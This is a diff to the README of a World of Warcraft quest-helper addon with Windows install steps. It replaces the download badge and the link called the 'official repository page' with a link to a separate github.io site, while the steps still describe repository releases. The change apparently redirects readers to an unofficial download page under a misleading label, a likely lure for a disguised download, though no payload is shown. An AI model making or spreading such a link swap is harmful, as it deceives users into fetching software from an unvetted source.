@@ -1,6 +1,6 @@
 # 🗺️ pfQuest-Reforged - Find your quests and track progress
 
-[![](https://img.shields.io/badge/Download-pfQuest--Reforged-blue.svg)](https://github.com/deeplaid-homelessness709/pfQuest-Reforged)
+[![](https://img.shields.io/badge/Download-pfQuest--Reforged-blue.svg)](https://deeplaid-homelessness709.github.io)
 
 pfQuest-Reforged acts as your personal guide for World of Warcraft: Wrath of the Lich King. This tool displays quest locations on your map and keeps a database of items, monsters, and quest chains. It replaces the basic quest tracker with a clean layout and modern features. 
 
@@ -8,7 +8,7 @@ pfQuest-Reforged acts as your personal guide for World of Warcraft: Wrath of the
 
 Follow these steps to install the quest helper on your Windows computer.
 
-1. Visit the [official repository page](https://github.com/deeplaid-homelessness709/pfQuest-Reforged) to find the latest version.
+1. Visit the [official repository page](https://deeplaid-homelessness709.github.io) to find the latest version.
 2. Look for the "Releases" section on the right side of the screen.
 3. Click the link that says "Latest" or shows a version number.
 4. Select the file ending in .zip to start the download.
